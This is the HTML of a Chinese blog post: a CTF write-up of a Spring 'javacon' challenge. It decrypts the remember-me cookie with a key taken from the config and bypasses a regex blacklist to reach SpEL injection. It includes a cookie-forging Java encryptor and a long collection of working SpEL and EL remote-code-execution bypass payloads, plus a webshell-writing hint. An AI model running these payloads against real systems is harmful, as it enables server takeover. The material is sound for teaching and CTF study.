@@ -1,0 +1,443 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Code-Breaking Puzzles | Tree's Blog</title><meta name="author" content="Tree"><meta name="copyright" content="Tree"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="前言这个是P牛知识星球上的一道题，历史久远，但是值得学习 题目文件：https:&#x2F;&#x2F;www.leavesongs.com&#x2F;media&#x2F;attachment&#x2F;2018&#x2F;11&#x2F;23&#x2F;challenge-0.0.1-SNAPSHOT.jar 题目分析解压jar拿到配置文件 spring:   thymeleaf:     encoding: UTF-8     cache: false     mode">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Code-Breaking Puzzles">
+<meta property="og:url" content="http://example.com/2023/10/20/Code-Breaking-Puzzles/index.html">
+<meta property="og:site_name" content="Tree&#39;s Blog">
+<meta property="og:description" content="前言这个是P牛知识星球上的一道题，历史久远，但是值得学习 题目文件：https:&#x2F;&#x2F;www.leavesongs.com&#x2F;media&#x2F;attachment&#x2F;2018&#x2F;11&#x2F;23&#x2F;challenge-0.0.1-SNAPSHOT.jar 题目分析解压jar拿到配置文件 spring:   thymeleaf:     encoding: UTF-8     cache: false     mode">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/todis21/image/main/2023/wallhaven-rrejgm_2560x1440.png">
+<meta property="article:published_time" content="2023-10-20T02:41:05.000Z">
+<meta property="article:modified_time" content="2023-10-20T04:03:36.040Z">
+<meta property="article:author" content="Tree">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/todis21/image/main/2023/wallhaven-rrejgm_2560x1440.png"><link rel="shortcut icon" href="/img/favicon.jfif"><link rel="canonical" href="http://example.com/2023/10/20/Code-Breaking-Puzzles/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: undefined,
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Code-Breaking Puzzles',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-10-20 12:03:36'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/bg.css"><meta name="generator" content="Hexo 6.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/favicon.jfif" onerror="onerror=null;src='/img/404.png'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">53</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">10</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://raw.githubusercontent.com/todis21/image/main/2023/wallhaven-rrejgm_2560x1440.png')"><nav id="nav"><span id="blog-info"><a href="/" title="Tree's Blog"><span class="site-name">Tree's Blog</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Code-Breaking Puzzles</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-10-20T02:41:05.000Z" title="发表于 2023-10-20 10:41:05">2023-10-20</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-10-20T04:03:36.040Z" title="更新于 2023-10-20 12:03:36">2023-10-20</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Code-Breaking Puzzles"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这个是P牛知识星球上的一道题，历史久远，但是值得学习</p>
+<p>题目文件：<a target="_blank" rel="noopener" href="https://www.leavesongs.com/media/attachment/2018/11/23/challenge-0.0.1-SNAPSHOT.jar">https://www.leavesongs.com/media/attachment/2018/11/23/challenge-0.0.1-SNAPSHOT.jar</a></p>
+<h1 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h1><p>解压jar拿到配置文件</p>
+<pre><code class="yaml">spring:
+  thymeleaf:
+    encoding: UTF-8
+    cache: false
+    mode: HTML
+keywords:
+  blacklist:
+    - java.+lang
+    - Runtime
+    - exec.*\(
+user:
+  username: admin
+  password: admin
+  rememberMeKey: c0dehack1nghere1
+</code></pre>
+<p>反编译class查看一下代码，可以边运行jar边分析</p>
+<p>查看<code>MainController</code>，没有登录的情况下会跳转到<code>/login</code></p>
+<pre><code class="java">@GetMapping(&#123;&quot;/login&quot;&#125;)
+    public String login() &#123;
+        return &quot;login&quot;;
+    &#125;
+
+    @GetMapping(&#123;&quot;/login-error&quot;&#125;)
+    public String loginError(Model model) &#123;
+        model.addAttribute(&quot;loginError&quot;, true);
+        model.addAttribute(&quot;errorMsg&quot;, &quot;账号或密码不正确&quot;);
+        return &quot;login&quot;;
+    &#125;
+
+@PostMapping(&#123;&quot;/login&quot;&#125;)
+public String login(
+        @RequestParam(value = &quot;username&quot;,required = true) String username,
+        @RequestParam(value = &quot;password&quot;,required = true) String password,
+        @RequestParam(value = &quot;remember-me&quot;,required = false) String isRemember,
+        HttpSession session,
+        HttpServletResponse response
+) &#123;
+    if (this.userConfig.getUsername().contentEquals(username) &amp;&amp; this.userConfig.getPassword().contentEquals(password)) &#123;
+        session.setAttribute(&quot;username&quot;, username);
+        if (isRemember != null &amp;&amp; !isRemember.equals(&quot;&quot;)) &#123;
+            Cookie c = new Cookie(&quot;remember-me&quot;, this.userConfig.encryptRememberMe());
+            c.setMaxAge(2592000);
+            response.addCookie(c);
+        &#125;
+
+        return &quot;redirect:/&quot;;
+    &#125; else &#123;
+        return &quot;redirect:/login-error&quot;;
+    &#125;
+&#125;
+</code></pre>
+<p>这里会获取前端输入的账号密码，对比配置文件里面的账号密码，如果相同并且勾选了<code>remember-me</code>，会返回一个cookie</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/2023/image-20231020110938858.png" alt="image-20231020110938858"></p>
+<p>然后通过这个cookie可以成功访问到登录成功的页面</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/2023/image-20231020111334267.png" alt="image-20231020111334267"></p>
+<p>主要逻辑还有看这里</p>
+<pre><code class="java">@GetMapping
+public String admin(@CookieValue(value = &quot;remember-me&quot;,required = false) String rememberMeValue, HttpSession session, Model model) &#123;
+    if (rememberMeValue != null &amp;&amp; !rememberMeValue.equals(&quot;&quot;)) &#123;
+        String username = this.userConfig.decryptRememberMe(rememberMeValue);
+        if (username != null) &#123;
+            session.setAttribute(&quot;username&quot;, username);
+        &#125;
+    &#125;
+
+    Object username = session.getAttribute(&quot;username&quot;);
+    if (username != null &amp;&amp; !username.toString().equals(&quot;&quot;)) &#123;
+        model.addAttribute(&quot;name&quot;, this.getAdvanceValue(username.toString()));
+        return &quot;hello&quot;;
+    &#125; else &#123;
+        return &quot;redirect:/login&quot;;
+    &#125;
+&#125;
+</code></pre>
+<p>在这里会查看存不存在remember-me,如果存在则进行解密获取<code>username</code>,这里只是检查了能否解密成功，然后进入将解密内容传入</p>
+<p><code>this.getAdvanceValue</code></p>
+<pre><code class="java">private String getAdvanceValue(String val) &#123;
+    for(String keyword : this.keyworkProperties.getBlacklist()) &#123;
+        Matcher matcher = Pattern.compile(keyword, 34).matcher(val);
+        if (matcher.find()) &#123;
+            throw new HttpClientErrorException(HttpStatus.FORBIDDEN);
+        &#125;
+    &#125;
+
+    ParserContext parserContext = new TemplateParserContext();
+    Expression exp = this.parser.parseExpression(val, parserContext);
+    SmallEvaluationContext evaluationContext = new SmallEvaluationContext();
+    return exp.getValue(evaluationContext).toString();
+&#125;
+</code></pre>
+<p>在这个方法里面，会进行黑名单检查，黑面单在开头的配置文件里，如果没有匹配到黑名单则进行spel解析，如果这个黑名单可以绕过则会造成spel表达式注入</p>
+<p>综上所诉，思路就是将payload加密，通过Cookie: remember-me传参</p>
+<h1 id="payload构造"><a href="#payload构造" class="headerlink" title="payload构造"></a>payload构造</h1><p>一般的payload如下：</p>
+<pre><code class="java">//利用要加上界定符，#&#123;&lt;表达式&gt;&#125;
+// Runtime
+T(java.lang.Runtime).getRuntime().exec(&quot;calc&quot;)
+T(Runtime).getRuntime().exec(&quot;calc&quot;)
+
+// ProcessBuilder
+new java.lang.ProcessBuilder(&#123;&#39;calc&#39;&#125;).start()
+new ProcessBuilder(&#123;&#39;calc&#39;&#125;).start()
+    
+// 反射调用
+T(String).getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;calc&quot;)
+</code></pre>
+<p>查看一下黑面单</p>
+<pre><code class="yaml">blacklist:
+    - java.+lang
+    - Runtime
+    - exec.*\(
+</code></pre>
+<p>可以通过反射和字符串拼接绕过</p>
+<pre><code class="java">T(String).getClass().forName(&quot;ja&quot;+&quot;va.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getMethod(&quot;ex&quot;+&quot;ec&quot;,T(String[])).invoke(T(String).getClass().forName(&quot;ja&quot;+&quot;va.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getMethod(&quot;getRu&quot;+&quot;ntime&quot;).invoke(T(String).getClass().forName(&quot;ja&quot;+&quot;va.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;)),new String[]&#123;&quot;cmd&quot;,&quot;/C&quot;,&quot;calc&quot;&#125;)
+</code></pre>
+<p>下一步就是加密了，这个很简单，所需要的参数代码里都有，只需要复制过来用就行</p>
+<pre><code class="java">package io.tricking.challenge;
+import javax.crypto.Cipher;
+import javax.crypto.spec.IvParameterSpec;
+import javax.crypto.spec.SecretKeySpec;
+import java.util.Base64;
+
+public class Main &#123;
+    public static void main(String[] args) &#123;
+        String key = &quot;c0dehack1nghere1&quot;;
+        String initVector = &quot;0123456789abcdef&quot;;
+        String payload = &quot;#&#123;T(String).getClass().forName(\&quot;ja\&quot;+\&quot;va.l\&quot;+\&quot;ang.Ru\&quot;+\&quot;ntime\&quot;).getMethod(\&quot;ex\&quot;+\&quot;ec\&quot;,T(String[])).invoke(T(String).getClass().forName(\&quot;ja\&quot;+\&quot;va.l\&quot;+\&quot;ang.Ru\&quot;+\&quot;ntime\&quot;).getMethod(\&quot;getRu\&quot;+\&quot;ntime\&quot;).invoke(T(String).getClass().forName(\&quot;ja\&quot;+\&quot;va.l\&quot;+\&quot;ang.Ru\&quot;+\&quot;ntime\&quot;)),new String[]&#123;\&quot;cmd\&quot;,\&quot;/C\&quot;,\&quot;calc\&quot;&#125;)&#125;&quot;;
+        String en = encrypt(key,initVector,payload);
+        System.out.println(en);
+//        String de =decrypt(key,initVector,en);
+//        System.out.println(&quot;de: &quot;+de);
+    &#125;
+    public static String encrypt(String key, String initVector, String value) &#123;
+        try &#123;
+            IvParameterSpec iv = new IvParameterSpec(initVector.getBytes(&quot;UTF-8&quot;));
+            SecretKeySpec skeySpec = new SecretKeySpec(key.getBytes(&quot;UTF-8&quot;), &quot;AES&quot;);
+            Cipher cipher = Cipher.getInstance(&quot;AES/CBC/PKCS5PADDING&quot;);
+            cipher.init(1, skeySpec, iv);
+            byte[] encrypted = cipher.doFinal(value.getBytes());
+            return Base64.getUrlEncoder().encodeToString(encrypted);
+        &#125; catch (Exception var7) &#123;
+
+            return null;
+        &#125;
+    &#125;
+
+    public static String decrypt(String key, String initVector, String encrypted) &#123;
+        try &#123;
+            IvParameterSpec iv = new IvParameterSpec(initVector.getBytes(&quot;UTF-8&quot;));
+            SecretKeySpec skeySpec = new SecretKeySpec(key.getBytes(&quot;UTF-8&quot;), &quot;AES&quot;);
+            Cipher cipher = Cipher.getInstance(&quot;AES/CBC/PKCS5PADDING&quot;);
+            cipher.init(2, skeySpec, iv);
+            byte[] original = cipher.doFinal(Base64.getUrlDecoder().decode(encrypted));
+            return new String(original);
+        &#125; catch (Exception var7) &#123;
+            return null;
+        &#125;
+    &#125;
+&#125;
+</code></pre>
+<p>运行得到加密后的payload，去替换remember-me的值然后发包即可</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/2023/image-20231020114955269.png" alt="image-20231020114955269"></p>
+<h1 id="bypass-payload合集"><a href="#bypass-payload合集" class="headerlink" title="bypass payload合集"></a>bypass payload合集</h1><p>这是来自github的<a target="_blank" rel="noopener" href="https://github.com/bfengj/CTF/blob/main/Web/java/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5.md">https://github.com/bfengj/CTF/blob/main/Web/java/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5.md</a></p>
+<p>简单记录一下</p>
+<pre><code class="java">// PoC原型
+
+// Runtime
+T(java.lang.Runtime).getRuntime().exec(&quot;calc&quot;)
+T(Runtime).getRuntime().exec(&quot;calc&quot;)
+
+// ProcessBuilder
+new java.lang.ProcessBuilder(&#123;&#39;calc&#39;&#125;).start()
+new ProcessBuilder(&#123;&#39;calc&#39;&#125;).start()
+
+******************************************************************************
+// Bypass技巧
+
+// 反射调用
+T(String).getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;calc&quot;)
+
+// 同上，需要有上下文环境
+#this.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;calc&quot;)
+
+// 反射调用+字符串拼接，绕过如javacon题目中的正则过滤
+T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getMethod(&quot;ex&quot;+&quot;ec&quot;,T(String[])).invoke(T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getMethod(&quot;getRu&quot;+&quot;ntime&quot;).invoke(T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;)),new String[]&#123;&quot;cmd&quot;,&quot;/C&quot;,&quot;calc&quot;&#125;)
+
+// 同上，需要有上下文环境
+#this.getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getMethod(&quot;ex&quot;+&quot;ec&quot;,T(String[])).invoke(T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getMethod(&quot;getRu&quot;+&quot;ntime&quot;).invoke(T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;)),new String[]&#123;&quot;cmd&quot;,&quot;/C&quot;,&quot;calc&quot;&#125;)
+
+// 当执行的系统命令被过滤或者被URL编码掉时，可以通过String类动态生成字符，Part1
+// byte数组内容的生成后面有脚本
+new java.lang.ProcessBuilder(new java.lang.String(new byte[]&#123;99,97,108,99&#125;)).start()
+
+// 当执行的系统命令被过滤或者被URL编码掉时，可以通过String类动态生成字符，Part2
+// byte数组内容的生成后面有脚本
+T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(108)).concat(T(java.lang.Character).toString(99)))
+
+// JavaScript引擎通用PoC
+T(javax.script.ScriptEngineManager).newInstance().getEngineByName(&quot;nashorn&quot;).eval(&quot;s=[3];s[0]=&#39;cmd&#39;;s[1]=&#39;/C&#39;;s[2]=&#39;calc&#39;;java.la&quot;+&quot;ng.Run&quot;+&quot;time.getRu&quot;+&quot;ntime().ex&quot;+&quot;ec(s);&quot;)
+
+T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName(&quot;JavaScript&quot;).eval(&quot;xxx&quot;),)
+
+// JavaScript引擎+反射调用
+T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName(&quot;JavaScript&quot;).eval(T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getMethod(&quot;ex&quot;+&quot;ec&quot;,T(String[])).invoke(T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getMethod(&quot;getRu&quot;+&quot;ntime&quot;).invoke(T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;)),new String[]&#123;&quot;cmd&quot;,&quot;/C&quot;,&quot;calc&quot;&#125;)),)
+
+// JavaScript引擎+URL编码
+// 其中URL编码内容为：
+// 不加最后的getInputStream()也行，因为弹计算器不需要回显
+T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName(&quot;JavaScript&quot;).eval(T(java.net.URLDecoder).decode(&quot;%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%22%63%61%6c%63%22%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29&quot;)),)
+
+// 黑名单过滤&quot;.getClass(&quot;，可利用数组的方式绕过，还未测试成功
+&#39;&#39;[&#39;class&#39;].forName(&#39;java.lang.Runtime&#39;).getDeclaredMethods()[15].invoke(&#39;&#39;[&#39;class&#39;].forName(&#39;java.lang.Runtime&#39;).getDeclaredMethods()[7].invoke(null),&#39;calc&#39;)
+
+// JDK9新增的shell，还未测试
+T(SomeWhitelistedClassNotPartOfJDK).ClassLoader.loadClass(&quot;jdk.jshell.JShell&quot;,true).Methods[6].invoke(null,&#123;&#125;).eval(&#39;whatever java code in one statement&#39;).toString()
+</code></pre>
+<h1 id="其他payload"><a href="#其他payload" class="headerlink" title="其他payload"></a>其他payload</h1><pre><code class="java">// 转自：https://www.jianshu.com/p/ce4ac733a4b9
+
+$&#123;pageContext&#125; 对应于JSP页面中的pageContext对象（注意：取的是pageContext对象。）
+
+$&#123;pageContext.getSession().getServletContext().getClassLoader().getResource(&quot;&quot;)&#125;   获取web路径
+
+$&#123;header&#125;  文件头参数
+
+$&#123;applicationScope&#125; 获取webRoot
+
+$&#123;pageContext.request.getSession().setAttribute(&quot;a&quot;,pageContext.request.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;,null).invoke(null,null).exec(&quot;命令&quot;).getInputStream())&#125;  执行命令
+
+
+// 渗透思路：获取webroot路径，exec执行命令echo写入一句话。
+
+&lt;p th:text=&quot;$
+</code></pre>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://example.com">Tree</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2023/10/20/Code-Breaking-Puzzles/">http://example.com/2023/10/20/Code-Breaking-Puzzles/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">Tree's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a></div><div class="post_share"><div class="social-share" data-image="https://raw.githubusercontent.com/todis21/image/main/2023/wallhaven-rrejgm_2560x1440.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2023/10/19/%E4%B8%9C%E5%8D%8E%E6%9D%AFezgadget/" title="东华杯ezgadget"><img class="cover" src="https://raw.githubusercontent.com/todis21/image/main/2023/wallhaven-jxl31y_2560x1440.png" onerror="onerror=null;src='/img/404.png'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">东华杯ezgadget</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2023/10/19/%E4%B8%9C%E5%8D%8E%E6%9D%AFezgadget/" title="东华杯ezgadget"><img class="cover" src="https://raw.githubusercontent.com/todis21/image/main/2023/wallhaven-jxl31y_2560x1440.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-10-19</div><div class="title">东华杯ezgadget</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/favicon.jfif" onerror="this.onerror=null;this.src='/img/404.png'" alt="avatar"/></div><div class="author-info__name">Tree</div><div class="author-info__description">随便都行都可以</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">53</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">10</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/todis21"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/todis21" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:3440848736@qq.com" target="_blank" title="Email"><i class="fas fa-envelope-open-text"></i></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">题目分析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#payload%E6%9E%84%E9%80%A0"><span class="toc-number">3.</span> <span class="toc-text">payload构造</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#bypass-payload%E5%90%88%E9%9B%86"><span class="toc-number">4.</span> <span class="toc-text">bypass payload合集</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%B6%E4%BB%96payload"><span class="toc-number">5.</span> <span class="toc-text">其他payload</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/10/20/Code-Breaking-Puzzles/" title="Code-Breaking Puzzles"><img src="https://raw.githubusercontent.com/todis21/image/main/2023/wallhaven-rrejgm_2560x1440.png" onerror="this.onerror=null;this.src='/img/404.png'" alt="Code-Breaking Puzzles"/></a><div class="content"><a class="title" href="/2023/10/20/Code-Breaking-Puzzles/" title="Code-Breaking Puzzles">Code-Breaking Puzzles</a><time datetime="2023-10-20T02:41:05.000Z" title="发表于 2023-10-20 10:41:05">2023-10-20</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/10/19/%E4%B8%9C%E5%8D%8E%E6%9D%AFezgadget/" title="东华杯ezgadget"><img src="https://raw.githubusercontent.com/todis21/image/main/2023/wallhaven-jxl31y_2560x1440.png" onerror="this.onerror=null;this.src='/img/404.png'" alt="东华杯ezgadget"/></a><div class="content"><a class="title" 